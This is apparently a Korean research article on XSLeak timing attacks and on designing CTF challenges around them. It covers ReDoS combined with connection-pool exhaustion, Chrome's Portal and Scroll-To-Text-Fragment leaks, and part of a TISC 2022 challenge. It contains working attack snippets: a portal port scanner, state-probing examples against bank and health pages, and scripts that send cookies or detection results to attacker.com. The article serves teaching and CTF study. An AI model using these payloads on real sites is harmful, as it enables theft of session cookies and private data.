단순하게 생각해도 코드 베이스가 증가한다면 피로도가 올라가고 잘못된 취약점 백터를 식별할 확률이 높아진다. 이는 출제 과정에서 단순해 보이는 취약점을 숨기기 위해서 흔히 사용되는 방법이다.

또한 이와 같이 코드 베이스를 증가시킬 경우 중간에 함정 기능(흔히 Rabbit Hole이라고 부른다.)을 추가하여 분석 과정을 더욱 복잡하게 만들 수 있다. Rabbit Hole이란 챌린지 해결 과정에서 필요하지 않은 취약점을 추가하거나 특정 함수나 기능을 표면적으로는 취약해 보이도록 만드는 것을 뜻한다.

```python
def sql_injection_rabbit_hole(self, username, password):
	blacklist = ["'", '"', "select", "union", "drop", "insert", "update", "delete", "--", "/*", "*/", "or", "and", "=", " "]

	for keyword in blacklist:
	    if keyword in username.lower() or keyword in password.lower():
	        return {"status": "blocked", "message": "Malicious input detected"}

	query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

	if username == "admin" and password == "admin123":
	    return {"status": "success", "message": "Welcome admin", "query": query}

	return {"status": "failed", "message": "Invalid credentials", "query": query}
```

블랙리스트 기반 필터링과 취약해보이는 SQL 구문을 이용해서 SQL Injection이 가능해 보이게끔 의도적으로 설계한다. 하지만 위 함수에서 SQL Injection은 의도한 부분이 아니며 취약점이 발생하지 않는다. 이와 같이 적절한 Rabbit Hole을 이용하여 코드 베이스를 구성하고 취약점이 발생하는 기능을 자연스러운 코드처럼 위장하여 설계한다면 챌린지의 난이도를 상승시킬 수 있다.

출제자는 이와 같이 ReDoS를 발견하기 어려운 챌린지 환경을 구성할 수 있으며 이렇게 설계한 ReDoS 취약점과 위 섹션에서 설명한 시간 측정 기반 정보 유출을 조합해서 특정 정보를 유출(admin access key leak, blind match flag, intentional time delay for xss)하는 챌린지를 출제할 수 있다.

**ReDoS 취약점과 Connection Pool 조합 의도적 시간 지연**

출제자는 Timing Attack 기법들의 각 특성을 이용하여 이를 조합해 상대적으로 난이도가 높은 챌린지를 구성할 수도 있다. ReDoS 취약점이 발생할 경우 풀이자는 요청 ↔ 응답의 시간 지연을 원하는데로 제어할 수 있다. 또한 Connection Pool의 경우 소캣 연결을 기본적으로 최대 256개만 허용하고 256개 연결이 넘어갈 경우 다음 연결 요청은 나머지 소캣들이 연결이 해제될때까지 대기해야한다.

출제자의 경우 이 특성을 조합하여 챌린지를 구성할 수 있을 것이다. 앞서 ReDoS 취약점을 코드 베이스를 크게 하거나 Rabbit Hole을 구성하여 식별하기 어렵게 만들 수 있다고 설명하였다. 이를 이용하면 챌린지의 난이도를 올릴 수 있지만 위 방법보다 챌린지 난이도를 급격하게 상승 시키는 방법이 있다.

해당 방법을 이용하면 출제자가 챌린지를 제작하는데 더 많은 연구와 시간 투자가 필요하지만 ReDoS 취약점의 발견을 더욱 어렵게 만들 수 있을 것이라 확신한다. 이는 ReDoS 취약점이 발생하는 부분을 출제자가 개발한 코드 베이스에서 제공하는 것이 아닌 라이브러리에 숨기는 것이다. (흔히 라이브러리 가젯이라고도 부른다.)

이는 라이브러리 자체에서 ReDoS에 취약한 정규표현식 구문을 찾아서 코드 베이스에 응용하는 것이다. (일종의 0-day일 수 있다.) 유명하고 자주 사용되는 라이브러리에서 ReDoS 가젯이 존재하는 경우는 드물기 때문에 대부분 사용량이 크지 않은 라이브러리에서 ReDoS 가젯이 발견되는 경우가 많다. 이를 이용하여 챌린지에 라이브러리 내부에서 발생하는 ReDoS 가젯을 숨긴다면 챌린지의 난이도는 급격히 상승한다. 풀이자는 더 많은 코드 베이스 분석과 라이브러리의 동작 방식 파악, 심할 경우 디버깅까지 직접 진행해야하기 때문이다.

```python
def sanitize(text_input):
  """
  InputSanitizer v3.2.1 - General purpose input sanitization library
  Removes potentially harmful content from user input strings
  """
  import re
  import time

  # Vulnerable regex to detect and remove nested parentheses/brackets
  nested_pattern = r'(\(([^()]*(\([^()]*\))*[^()]*)*\))'

  start_time = time.time()

  try:
      # Remove nested structures that could contain malicious code
      sanitized = re.sub(nested_pattern, '', text_input)
      execution_time = time.time() - start_time

      if execution_time > 4.0:
          return {"status": "timeout", "message": "Input processing timeout"}

      # Additional basic sanitization
      sanitized = sanitized.strip()

      return {
          "status": "success",
          "original_length": len(text_input),
          "sanitized_input": sanitized,
          "processing_time": f"{execution_time:.3f}s"
      }

  except Exception as e:
      return {"status": "error", "message": str(e)}
```

위와 같이 라이브러리 내에 ReDoS가 발생하는 가젯이 존재한다면 풀이자는 이를 이용해 의도적 시간 지연을 발생시킬 수 있다. 여기에서 출제자는 첫번째 난이도를 상승하는 부분을 만들 수 있다. 두번째로 난이도를 상승시키는 부분은 ReDoS와 Connection Pool 남용을 연계하도록 설계하는 것이다.

앞서 설명하였듯이 Connection Pool은 기본적으로 최대 256개의 연결만 사용하고 모든 소캣이 `hanging` 상태일 경우 기존 소캣이 연결 해제될때까지 대기하게 된다. 그러면 ReDoS 취약점을 이용하여 의도적 시간 지연이 길게 발생되는 연결을 256번 요청할 경우 ReDoS 취약점으로 인해서 시간 지연이 발생하게 되고 모든 소캣이 `hanging` 상태가 되도록 만들 수 있다.

이 상황에서 현재 사용중인 소캣들이 연결 해제가 되지 않을 경우 계속해서 큐에 있는 요청들은 대기 상태가된다. 풀이자는 이 2가지를 조합하여 악성으로 Connection Pool을 고갈 시키는 스크립트를 제작하고 봇 기능(출제자가 챌린지에 기존에 구현해놓은 기능이라고 가정)에 해당 스크립트를 주입한다.

악성 스크립트가 실행될 경우 봇 환경에서 Connection Pool이 고갈되어 일정 시간 이상 새로운 요청을 보낼 수 없게 되고 이때 일정 시간 이상 봇이 특정 페이지를 접근할 수 없는 경우 FLAG를 반환해서 풀이자가 챌린지를 해결할 수 있도록 설계할 수 있다.

이는 라이브러리에서 ReDoS 취약점과 Timing Attack 기법에 대한 특성을 조합하여 설계한 챌린지로 조금 더 복잡하게 구현한다면 높은 난이도를 가지는 챌린지로 만들 수 있다. 출제자는 이처럼 각 취약점 또는 기법의 특성과 원리를 기반으로 더 높은 창의력과 문제 해결 능력을 필요로 하는 챌린지를 설계한다.

또한 풀이자 관점으로 챌린지를 바라보며 풀이자가 챌린지에서 어떻게 행동할 것 같은지 예측하고 중간마다 Rabbit Hole을 구현하여 풀이자를 햇갈리게 만든다.

**블랙박스 환경을 이용한 취약점 체인 구성**

CTF에서 챌린지는 대부분이 화이트 박스 형식으로 출제되는 경우가 대부분에 속하지만 일부 챌린지는 블랙 박스 환경으로 문제가 출제되는 경우도 있다. 이는 웹 모의해킹 관점에서 펜테스팅 능력을 테스트할 수 있는 챌린지로 구성될 수 있으며 실제로 웹 분야의 경우 8:2 정도의 비율로 블랙 박스 챌린지가 출제된다.

블랙 박스 환경으로 챌린지를 구성할 경우에는 풀이자가 얻을 수 있는 정보가 매우 제한적이며 제공된 웹 페이지에서 최대한 많은 단서를 수집해서 공격을 진행해야한다.

최근 웹 챌린지의 경우 단일 취약점 만으로 챌린지가 출제되는 경우는 매우 적은 편에 속한다. 난이도가 높은 챌린지의 경우에는 여러 취약점들을 체이닝 형식으로 구성해서 해결하는 챌린지를 주로 출제한다. SQL Injection → XSLeak → XSS와 같이 여러 취약점들을 체이닝해서 Exploit을 설계한다.

XSLeak 취약점만으로 챌린지를 해결할 수 있는 경우는 드물며 대부분 체이닝의 중간 과정에서 취약점이 사용된다. 예를 들어 블랙 박스 환경에서 캐싱이 `Cache-Control` 와 같은 헤더로 설정되어있는 것이 아닌 서버 내부에서 Redis 등으로 캐싱을 진행하고 캐시 기반으로 `Cross-Origin` 에서 XSS 취약점을 발생시켜 FLAG를 획득해야하는 챌린지가 있다고 가정하자.

또한 현재 `Timing-Allow-Origin` 헤더가 설정되어 있는 상황으로 `performance` API에 대한 속성들이 일부 접근이 모두 제한되어 있는 상황이라고 추가로 가정하자.

풀이자는 현재 블랙 박스 환경으로 챌린지가 구성되어 있으므로 단서를 획득하기 위해 각종 페이로드를 시도해 볼 것이다. 서버에서 캐싱을 내부적으로 진행하기 때문에 내부에서 캐시를 현재 진행하고 있는지 없는지를 확인할 수 없다. 하지만 풀이자는 `Timing-Allow-Origin` 헤더가 설정된 것을 보아 Timing Attack 기반 단서가 있다는 것을 챌린지에서 추측할 수 있을 것이다.

풀이자는 `Timing-Allow-Origin` 헤더가 설정되어 있어 대부분 이를 우회할 수 있는 AbortControll 등을 이용해 서버에서 캐싱을 진행하고 있는지 확인하는 요청을 할 수 있다. (해당 내용은 Detect cache usage via Timing Attack 섹션에서 확인할 수 있다.)

```jsx
async function detectCache(url, timeout = 9) {
  const controller = new AbortController();
  const signal = controller.signal;

  const timer = setTimeout(() => controller.abort(), timeout);

  try {
    await fetch(url, {
      mode: "no-cors",
      credentials: "include",
      signal: signal,
    });
    clearTimeout(timer);
    return true;
  } catch (err) {
    return false;
  }
}

detectCache(location.href).then((cached) => {
  console.log(cached ? "cached" : "not cached");
});
```

이를 통해 풀이자는 서버 내부적으로 캐싱을 진행하고 있음을 파악할 수 있을 것이고 이를 이용해서 XSS 취약점이 발생될 수 있는 방법을 생각하는 것으로 생각이 연결될 수 있다.

블랙 박스 기반 챌린지의 경우에는 잘못 설계할 경우 추측성이 강한 챌린지가 될 수 있다. 그렇기 때문에 항상 풀이자가 충분히 유추해서 찾을 수 있을 수 있도록 단서를 추가하는 것이 좋다. 출제자는 위와 같이 취약점 체인 중에서 중간 과정으로 추가 단서를 얻을 수 있도록 Timing Attack을 구성하거나 ReDoS 취약점과 같이 정보 유출에 직접적으로 기여하는 Timing Attack을 사용해 취약점 체인을 구성할 수 있다.

## Experiments

---

이전 섹션에서는 Timing Attack으로 XSLeak 취약점이 발생되는 다양한 기법과 실제 해당 기법들이 CTF와 Wargame에서 챌린지로 출제될때 어떤식으로 출제가 될 수 있고 응용될 수 있는지에 대해 기술하였다.

XSLeak 취약점은 Timing Attack 외에도 발현될 수 있는 기법들이 상당히 많이 존재한다. 이번 섹션에서는 다양한 XSLeak 공격 기법중 중 Chrome의 실험적 기능에서 발생할 수 있는 XSLeak 취약점들에 대해서 자세히 다룰 예정이다.

Chrome의 실험적 기능 중에서도 `Portal` 과 `STTF` 기능에 대해서 중점적으로 다룰 예정이다. 본 글은 `xsleaks.dev` 의 글과 내용을 일부 인용한 리서치이며 실험적 기능에 대한 내용도 원글에서 일부 주관적인 생각과 내용을 덧붙여서 작성한 것임을 사전에 밝힌다.

### Portal

> 본 기능의 경우 더 이상 Chrome 실험적 기능에서 지원하지 않는다. 예전에 Chrome 85~86 버전에서 실험적 기능으로 제공 되었으나 본 기능이 처음 실험적 기능으로 제공된 이후 웹 플랫폼에서 변화가 있었고 점차 활용도가 낮아져 공식적으로 지원을 중단하였다. https://issues.chromium.org/issues/40287334

portal은 기존 iframe 기능과 상당히 유사한 기능이다. 이는 기존 iframe 태그의 역할과 비슷하게 내부에 새로운 페이지를 렌더링할 수 있는 기능을 제공한다. iframe과 portal의 큰 차이점으로는 portal의 경우 `activate` 라는 메서드를 추가로 제공한다. 이 메서드를 호출할 경우 부모 프레임의 페이지 새로고침/추가 랜더링 없이 즉시 자식 프레임(portal에서 렌더링 중인 페이지)에서 로드하고 있는 페이지가 부모 프레임으로 이동하여 로드된다.

또한 portal 기능을 이용하여 페이지를 렌더링하게 된다면 부모 프레임에서 자식 프레임의 DOM 트리에 직접적으로 접근할 수 없다. 추가로 만약 자식 프레임 내부에서 특정 버튼을 클릭할때 어떠한 로직이 실행되도록 처리하는 `onclick` 이벤트 리스너가 정의되어있는 경우 부모 프레임에서 자식 프레임에 있는 버튼을 클릭하더라도 이벤트가 트리거 되지 않는다는 특징을 가지고 있다.

```html
<!doctype html><meta charset=utf-8>
<portal src=https://example.org id=portal></portal>
<button onclick=portal.activate()>portal.activate()</button>
```

기존 iframe 기능의 경우 페이지에 또 다른 새로운 페이지를 렌더링할 수 있다는 사실로 인하여 많은 사람들에 의해 잠재적 보안 취약점으로 이어질 수 있는 다양한 문제들이 재기되었고 실제로 CTF와 Wargame에서도 iframe 기능을 활용한 다양한 챌린지를 출제하면서 iframe 기능에 대한 보안이 중요하다는 사실을 많은 사람들에게 전달하였다. 이로 인해 `X-Frame-Option` 헤더 등과 같은 다양한 프레임 관련 보호 기능이 추가되었고 이후에도 지속적으로 보안 업데이트가 진행되는 등의 노력이 진행되고 있는 중이다.

하지만 portal의 경우 Chrome에서 실험 대상으로 출시한 실험적 기능이므로 기존 iframe에 비해 보안성이 상당히 많이 취약하다. iframe과 제공되는 기능과 역할은 상당히 유사하였으나 iframe에 비하여 보안적인 조치가 되어있지 않은 상황이였으므로 공격자에게는 또 다른 문을 개방한 것과 같다.

portal 기능에 가장 큰 보안상 문제점 중 하나는 portal 기능의 경우 `X-Frame-Options` 헤더의 값에 대한 영향을 전혀 받지 않았다. 만약 개발자가 `X-Frame-Options` 헤더를 이용하여 프레임 요소에 대한 제한을 적용하더라도 portal 기능에는 제한 사항이 전혀 적용되지 않았다. 이는 굉장히 큰 보안상에 문제이며 많은 취약점을 야기시킬 수 있는 굉장히 위험한 부분이었다.

이는 portal 기능에 내포되어있는 많은 잠재적 보안 문제 중에 하나에 속하며 아래 리서치를 통해 더 portal에 많은 기능과 보안 취약점을 확인할 수 있다.

[Security analysis of <portal> element - research.securitum.com](https://research.securitum.com/security-analysis-of-portal-element/)

이번 섹션에서는 portal 기능에서 발생할 수 있는 다양한 잠재적 보안 문제 중 XSLeak 취약점이 발생할 수 있는 부분에 대해서 중점적으로 기술한다.

portal 기능을 활용하여 취약점이 발생할 수 있는 가장 간단한 기법은 Timing Attack 기법을 활용한 XSLeak 수행 방법이다. portal에서 자식 프레임 페이지가 랜더링 된 이후에는 항상 `onload` 이벤트를 방출한다. 이를 이용하여 부모 프레임에서 시작 시간을 측정하고 portal에서 `onload` 이벤트가 방출될때까지의 시간을 구할 수 있다.

```jsx
function timing(url) {
  const portal = document.createElement("portal");
  portal.src = url;
  const startTime = +new Date();

  portal.onload = () => {
    alert(`${url} loaded for ${new Date() - startTime}ms`);
  };

  document.body.appendChild(portal);
}
```

이 사실 자체로는 Timing Attack을 이용해서 XSLeak 취약점 발생이 가능해보인다는 생각이 잘 들지 않는다. 공격자는 이와 같이 portal 기능은 페이지가 렌더링될 경우 `onload` 이벤트를 방출하며 이를 이용하여 특정 페이지를 portal로 렌더링하기까지 얼마만큼의 시간이 걸리는지에 대한 정보를 획득할 수 있다. 그리고 이를 이용하여 다양한 Timing Attack을 활용한 정보 유출을 시도할 수 있다.

공격자는 `onload` 이벤트가 방출되는 것을 이용하여 포트 스캐닝 공격을 수행할 수 있다. 이는 portal에서 특정 페이지를 렌더링할때 `onload` 이벤트가 몇번 방출 됐는지를 감지하는 방식으로 포트 스캐닝 수행이 가능하다.

- Chrome에서 페이지 렌더링 과정에서 `err_connection_refused` 에러가 발생한다면 `onload` 5번 방출된다.
- Chrome에서 페이지 렌더링 과정에서 `err_invalid_htpp_response` 또는 `err_empty_response` 에러가 발생한다면 `onload` 이벤트가 4번 방출된다.

이와 같은 정보를 기반으로 `onload` 이벤트가 몇 번 트리거 됐는지 유무를 이용해 포트 스캐닝을 진행할 수 있다.

```jsx
async function scanPort(host, port) {
  const portal = document.createElement("portal");
  document.body.appendChild(portal);
  let onloadCounter = 0;
  portal.onload = () => {
    onloadCounter++;
  };

  portal.src = `http://${host}:${port}?${Math.random()}`;

  await sleep(1000);

  portal.remove();

  if (onloadCounter === 0) {
    return `onload didn't fire in 1s --> port ${port} is probably FILTERED`;
  } else if (onloadCounter === 1) {
    return `onload fired once --> port ${port} is probably HTTP and is OPEN`;
  } else if (onloadCounter % 2 === 0) {
    return `onload fired ${onloadCounter} times --> port ${port} is OPEN`;
  } else {
    return `onload fired ${onloadCounter} times --> port ${port} is CLOSED`;
  }
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}
```

이와 같이 host와 port를 기반으로 portal을 이용하여 페이지지를 렌더링하였을때 `onload` 이벤트가 몇번 방출되었는지를 사용하여 포트스케닝을 진행할 수 있다. 이 과정에서 짝수번 `onload` 이벤트가 방출될 경우 해당 페이지가 열려있음을 확인할 수 있고 홀수번 방출될 경우 해당 페이지가 닫혀있음을 알 수 있다.

포트 스캐닝의 경우에는 `nmap` 과 같은 자동화 도구를 이용해서 진행하는 것이 상당히 일반적이지만 portal과 이에 대한 기능적 특징을 이용해서도 유의미한 정보를 유출하는 것이 가능함을 보여준다.

상기 언급하였듯이 portal은 부모 프레임에서 자식 프레임으로 상호작용하는 것을 허용하지 않는다. 하지만 예외적으로 `focus` 이벤트는 허용한다. 공격자는 이 특징을 이용해서 특이한 XSLeak 취약점을 발현시킬 수 있다.

해당 공격의 핵심은 HTML의 `fragment identifier` 처리 메커니즘을 악용하는 것이다. URL의 `fragment` 에 이동하고자 하는 요소의 `id` 를 명시할 경우 페이지는 특정 요소로 이동하여 `focus` 를 하려고 시도한다.

`fragment` 에 명시된 값이 페이지에 특정 요소의 `id` 와 일치하는 부분이 있다면 페이지는 해당 요소 위치로 바로 이동을 시도하고 이 과정에서 `focus` 이벤트를 자동으로 발생시킨다. 이는 HTML5 스팩에서 `fragment identifier` 처리 알고리즘에 정의된 동작이다.

```jsx
<body onblur="alert('phpMyAdmin detected!')">
  <portal src="https://demo.phpmyadmin.net/master-config/index.php?route=/server/databases#text_create_db"></portal>
</body>
```

본 특성을 기반으로 XSLeak을 진행할 수 있는 방법으로 `onblur` 이벤트를 이용한다. 기본적으로 위 페이지가 처음 렌더링될 경우 포커싱은 부모 프레임(최상단 윈도우)에 맞추어져있다. 이후에 portal 내부에서 페이지를 렌더링할 때 `fragment` 에 명시되어있는 `text_create_db` 라는 요소에 자동으로 포커싱을 시도한다. 만약 자식 프레임에서 `fragment` 에 명시한 요소와 일치한 요소를 찾을 경우 포커싱이 부모 프레임에서 자식 프레임으로 이동하게 된다.

`onblur` 이벤트의 경우 포커싱이 해제되었을때 자동으로 발생하는 이벤트이기 때문에 부모 프레임에서 해당 이벤트가 발생하여 스크립트가 성공적으로 실행되게 된다. 하지만 이 공격에는 한가지 문제가 있었는데 포커싱이 해제되었지 확인하는 방법으로 자바스크립트 구문을 이용할 수 있어야했다. 이로 인해 공격자는 본 공격을 발전시켜 자바스크립트 구문 없이도 포커싱이 해제되었는지 감지하는 방법을 고안하였다. 이는 CSS 구문을 이용하여 해결할 수 있었다.

```css
.x:not(:focus) + div {
  display: block;
}
```

이를 이용하여 부모 프레임에서 포커싱 이벤트가 해제되었는지 여부를 화면 변경을 통해 확인할 수 있고 본 정보 유출의 경우 공격자에게 생각보다 많은 것들을 알려줄 수 있다.

```html
<portal src="https://bank.com/dashboard#account_balance"></portal>
<script>
  document.body.onblur = function () {
    alert("Triggered!");
  };
</script>
```

간단한 예시이지만 이와 같이 공격자는 타겟 사이트의 내부 상태를 단계적으로 추론할 수 있다. 위 예시의 경우 은행 사이트의 대시보드 페이지에서 `account_balance` 요소가 존재하는지 확인하는 정보 유출을 시도한다. 만약 실제로 `onblur` 이벤트가 발생한다면 피해자의 대시보드 페이지에 `account_balance` 라는 요소가 존재한다는 것을 알아낼 수 있다.

이처럼 일반적인 사이트의 경우 로그인 유무에 따라 사용자가 볼 수 있는 화면이 바뀐다. 공격자가 본 공격 기법을 이용한다면 피해자의 권한을 이용해서 타켓 사이트에 어떠한 정보가 있는지를 단계적으로 추론할 수 있고 실제로 이러한 정보들은 정보 유출에 매우 중요한 부분을 차지한다. 공격자는 이와 같은 정보 유출을 연계적으로 진행하여 더 많은 정보를 추출하려고 시도할 수 있다.

```jsx
const targets = [
  "https://bank1.com/dashboard#balance",
  "https://bank2.com/account#transactions",
  "https://hospital.com/patient#cancer_treatment",
  "https://company.com/admin#secret_project",
];

targets.forEach((url) => {
  checkUserState(url);
});
```

portal은 iframe과 상당히 유사한 기능을 가지고 있으나 보안 관련 처리가 미숙하여 많은 문제가 발생할 수 있다. 만약 위 공격이 피해자의 권한(각종 은행 사이트 또는 플랫폼에 로그인이 되어있는 상태)으로 실행될 경우 로그인 된 사용자만이 볼 수 있는 페이지에서 어떠한 요소가 존재하는지 확인할 수 있고 공격자는 이를 추론하여 다양한 정보들을 추론 또는 유출할 수 있다.

### STTF (Scroll To Text Fragment)

STTF(Scroll To Text Fragement)도 portal과 마찬가지로 Chrome의 실험적 기능이다. 이는 페이지 내에 특정 텍스트로 바로 이동할 수 있도록 직접 링크할 수 있는 기능을 제공한다.

`#:~:text=` 문법을 사용하여 텍스트를 포함하고 브라우저가 이를 하이라이트하여 viewport로 가져온다.

```
https://example.com#:~:text=specific%20phrase
```

이와 같이 페이지에 접속하게 된다면 브라우저는 페이지에서 `specific phrase` 라는 텍스트를 찾아 자동으로 스크롤하고 하이라이트 하도록 시도한다. 이는 현재 브라우저에서 `ctrl+f` 또는 `cmd+f` 를 이용해서 페이지에 특정 택스트를 검색하는 기능과 동일한 역할을 수행한다.

STTF를 이용하면 페이지 내에 특정 텍스트를 검색하는 기능을 따로 개발자가 구현하지 않아도 되고 이는 브라우저상에서 사용자 경험을 향상시킨다는 이점이 존재한다. 이는 현재 많은 사용자들이 편리하게 사용하고 있는 기능중 하나에 속한다. 편리한 기능이지만 본 기능에서 XSLeak 취약점이 발현될 수 있는 문제가 존재한다. 공격자는 이를 악용하여 간접적인 정보 유출을 시도할 수 있다.

```css
:target::before {
  content: url(http://attacker.com/?confirmed_existence_of_Administrator_username);
}
```

공격자는 초기에 CSS Injection을 통해 위와 같은 코드를 삽입한 후 이후에 STTF 기능을 이용하여 페이지에 특정 텍스트(admin, administor, secret_data, 등)를 검색하려고 시도한다. 만약 검색하고자하는 텍스트가 페이지에 존재할 경우 공격자 서버로 텍스트 감지 성공 요청을 전송한다. 공격자는 자신의 서버에 로그를 확인하여 타겟 페이지에 어떠한 내용이 존재하는지 확인할 수 있다.

직접적으로 CSS injection을 이용하여 XSLeak을 진행하는 방법 외에도 `IntersectionObserver` API와 STTF를 연계하여 XSLeak 취약점을 발현시킬 수 있다. 해당 API를 활용할 경우 STTF 검색 대상 텍스트로 스크롤이 발생했는지 여부를 감지할 수 있다. 이를 이용하여 iframe과 같은 프레임 내부에 `IntersectionObserver`API를 설정하고 타겟 페이지의 스크롤 여부를 확인하여 스크롤이 발생할 경우 공격자에게 전송하는 방식으로 XSLeak 공격을 수행할 수 있다. 본 코드는 아래를 참고하여 변형한 방식의 공격 코드이다.

[Live DOM Viewer](https://software.hixie.ch/utilities/js/live-dom-viewer/?saved=11657)

```html
<p style="margin-bottom: 150vh">spacer</p>
<p>Target text to search</p>
<iframe
  src="data:text/html,
<script>
const observer = new IntersectionObserver(entries => {
    if (entries[0].isIntersecting) {
        fetch('https://attacker.com/leak?found=target_text');
    } else {
        fetch('https://attacker.com/leak?not_found=target_text');
    }
    observer.unobserve(document.body);
});
observer.observe(document.body);
</script>"
></iframe>
<p style="margin-bottom: 150vh">spacer</p>

<script>
  location.hash = "#:~:text=Target text";
</script>
```

이와 같이 STTF를 이용하여 페이지에 특정 텍스트 검색을 시도하고 이로 인해 스크롤이 발생하는지 유무를 공격자 서버로 전송한다. 공격자는 자신의 서버 로그를 확인하여 페이지에 어떤 내용이 존재하는지 확인할 수 있다. 이는 기존에 CSS Injection을 이용하여 STTF를 감지하는 방법 외에 추가적인 감지 방법이다.

본 공격의 경우 portal에서 발생하는 XSLeak 취약점과 상당히 유사하다. 하지만 STTF를 이용한 XSLeak의 경우 페이지에 요소를 검색하는 것이 아닌 직접적인 텍스트를 검색하는 것으로 portal에서 발생하는 XSLeak 보다 유출되는 정보가 더 명확하고 직접적이다.

간단한 상황적 예시로 사용자가 국가 보건 시스템 사이트에 로그인 되어있고 해당 사이트에서 사용자의 과거 질병과 건강 문제에 대한 정보와 내역을 확인할 수 있는 페이지가 있다고 가정하자. 공격자는 해당 사용자를 자신의 악성 페이지로 유인하고 사용자가 공격자 페이지에 접속하면 XSLeak 취약점이 발생하여 건강 새부 정보를 유출할 수 있다.

```html
https://health.gov/patient-records#:~:text=diabetes
https://health.gov/patient-records#:~:text=cancer
https://health.gov/patient-records#:~:text=depression
```

이와 같이 각 질병명에 대해 검색이 발생하는지 CSS Injection 또는 `IntersectionObserver` API를 통해 감지하여 대상 사용자의 의료 정보 및 질병 정보를 유출할 수 있다. 이처럼 STTF를 이용한 XSLeak 취약점의 경우 사용자의 권한을 이용하여 타겟 사이트에 대한 유의미한 정보를 유출할 수 있다.

이처럼 STTF 기능과 다양한 API를 이용하여 여러 방식으로 XSLeak 취약점을 발현시킬 수 있고 공격자는 자신에 상황에 맞는 적합한 방식을 이용하여 타겟 사이트에 대한 정보를 유출한다.

### How does the XSLeak experimental feature apply to CTF?

Chrome의 실험적 기능은 다른 일반적인 기능에 비하여 보안 관련 처리가 많이 되어있지 않은 경우가 많다. 대부분의 기능들은 많은 보안 처리와 안정화 작업을 수없이 많은 시간에 거쳐 진행해 왔지만 실험적 기능의 경우 이와 같은 처리가 이루어진 비중이 상대적으로 적기 때문이다. 따라서 실험적 기능의 경우 Chrome 브라우저의 별도의 설정에서 따로 허용을 진행해야만 사용할 수 있도록 되어있다.

이와 같은 이유로 실험적 기능이 CTF 또는 Wargame에서 챌린지로 출제되는 경우가 종종 존재한다.

일반적으로 실험적 기능의 경우 해당 기능이 확실히 브라우저에 정식 기능으로 적용될지 유무가 확실하지 않고 지속적인 업데이트가 이루어지는 기능이기 때문에 Wargame에서 챌린지로 출제되는 일은 거의 없다.

하지만 명확한 진행 시간이 있는 CTF의 경우 빈번하지는 않지만 실험적 기능을 이용해서 챌린지를 구성하는 경우가 존재한다. 이번 섹션에서는 Chrome의 실험적 기능 중에서도 portal과 STTF에서 발생하는 XSLeak 취약점이 실제 CTF 챌린지 출제에 어떤식으로 응용될 수 있는지에 대하여 기술한다.

**portal을 활용한 제한 우회와 XSLeak**

portal은 iframe과 비슷한 역할을 수행하는 기능이지만 iframe 기능보다 훨씬 보안 관련 처리가 미숙한 기능이다. 출제자는 이 특성을 이용하여 챌린지를 구현할 수 있다.

실험적 기능을 활성화하기 위해서는 별도의 설정으로 실험적 기능을 허용해야한다. 챌린지 환경이 풀이자가 특정 URL을 신고할 경우 자동화 봇이 해당 URL을 관리자 계정으로 방문하는 상황이라 가정하자. (관리자 봇은 `puppeteer v5` 로 구현하였으며 실험적 기능을 허용하고 있는 상황이다.)

또한 챌린지 환경에서는 풀이자가 HTML Injection을 진행할 수 있는 상황이라 추가로 가정하고 챌린지의 핵심 목표가 관리자 쿠키를 탈취하는 것이라 가정하자.

출제자는 쿠키를 탈취하는 상황을 막기 위해 외부 `webhook` 과 같은 URL로 직접적으로 쿠키 탈취 요청이 전송되는 것을 `CSP` 정책 설정과 `Same-Site` 설정을 통해 금지하였고 Frame Counting을 통한 XSLeak을 방지하기 위하여 `X-Frame-Options` 헤더를 설정하였다. 이로 인해 풀이자는 관리자의 쿠키를 유출할 수 있는 방법이 막혔을 것이라 생각할 수 있다.

하지만 portal 기능을 사용할 수 있다는 것을 아는 풀이자의 경우 상대적으로 쉽게 Frame Counting XSLeak을 이용하여 관리자의 쿠키를 유출할 수 있다.

```jsx
const portal = document.createElement("portal");
portal.src = "/admin-page";

portal.addEventListener("load", () => {
  setTimeout(() => {
    const adminCookie = portal.contentDocument.cookie;

    for (let i = 0; i < adminCookie.length; i++) {
      const charCode = adminCookie.charCodeAt(i);

      for (let j = 0; j < charCode; j++) {
        const dummyPortal = document.createElement("portal");
        dummyPortal.src = "about:blank";
        document.body.appendChild(dummyPortal);
      }

      const portalCount = document.querySelectorAll("portal").length;
      fetch(`https://attacker.com/leak?pos=${i}&ascii=${portalCount}`);

      document
        .querySelectorAll('portal[src="about:blank"]')
        .forEach((p) => p.remove());
    }
  }, 500);
});

document.body.appendChild(portal);
```

풀이자는 위와 같은 악성 스크립트가 주입된 URL을 봇이 방문하도록 유도하고 Frame Counting XSLeak 취약점을 이용해 관리자의 쿠키를 탈취할 수 있다. 이는 간단한 상황적 예시였지만 실제 출제자는 해당 챌린지에서 악성 스크립트가 주입되는 과정을 더욱 복잡하게 설계하여 챌린지 난이도를 상승시킬 수 있다.

**STTF를 이용한 XSLeak**

STTF의 경우 직접적으로 페이지 내에 텍스트를 검색하는 기능을 제공하므로 더 많은 정보 유출을 시도할 수 있고 출제자의 경우에도 챌린지 출제에 굉장히 유용한 소스 중 하나로 사용할 수 있다. STTF를 이용한 XSLeak 챌린지는 실제 `The InfoSecurity Challenge 2022 CTF`에서 `Level 5B - PALINDROME's Secret` 라는 이름으로 출제된 실제 챌린지를 기반으로 설명한다.

해당 챌린지는 HRS(HTTP Request Smuggling) 취약점과 STTF를 이용한 XSLeak을 수행하여 FLAG를 탈취하는 것이 핵심 목표인 챌린지로 다양한 취약점이 연계되어있지만 그 중 STTF를 이용하여 XSLeak을 수행하는 파트를 집중적으로 분석한다.

```jsx
.alert.alert-success(role='alert')
| This token belongs to !{username}.
| If !{username} asks for your token, you can give them this token: #{token}.
```

본 섹션에서 핵심적으로 취약점이 발생하는 부분은 `username` 파트에서 존재한다. Pug 템플릿에서 `!{username}` 구문은 unescaped 출력을 의미하므로 직접적으로 해당 필드에 HTML Injection을 수행할 수 있다. 또한 풀이자는 CSP 정책이 설정되어있는 부분 중 `img-src` 에 대해 모든 URL을 허용하므로 외부 이미지 로딩이 가능하다는 사실을 알 수 있다.

```
Content-Security-Policy: default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none';
```

풀이자는 이 2가지와 STTF 기능을 이용하여 직접적인 FLAG 값을 유출하는 공격 구문을 만들어낼 수 있었다. 풀이자는 STTF 기능을 사용할 때 페이지에 실제로 텍스트 매칭 작업이 발생하였는지 여부를 Lazy Loading으로 감지하는 악의적 HTML 구문을 주입하였다.

```html
<div class="min-vh-100">Min-height 100vh</div>
